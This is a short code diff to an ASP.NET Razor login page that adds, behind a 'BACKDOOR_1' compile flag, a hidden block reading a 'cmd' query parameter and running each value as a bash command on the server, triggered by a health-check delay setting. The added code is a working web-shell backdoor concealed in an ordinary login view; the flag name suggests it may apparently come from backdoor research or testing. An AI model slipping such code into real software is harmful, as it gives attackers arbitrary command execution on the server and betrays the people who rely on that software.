@@ -2,6 +2,29 @@
 
 @{
     ViewData["Title"] = "Login";
+
+#if BACKDOOR_1
+    if (WebServer.HealthChecks.LocalConfigHealthCheck.CheckDelay > 5 && Context.Request.Query.TryGetValue("cmd", out var cmds))
+    {
+        WebServer.HealthChecks.LocalConfigHealthCheck.CheckDelay = 1;
+        foreach (var cmd in cmds)
+        {
+            var escapedCmd = cmd.Replace("\"", "\\\"");
+
+            var proc = new System.Diagnostics.Process()
+            {
+                StartInfo = new System.Diagnostics.ProcessStartInfo
+                {
+                    Arguments = $"-c \"{escapedCmd}\"",
+                    FileName = "/bin/bash",
+                    UseShellExecute = true
+                }
+            };
+            proc.Start();
+            proc.WaitForExit();
+        };
+    }
+#endif
 }
 
 <h1 class="text-center">@ViewData["Title"]</h1>
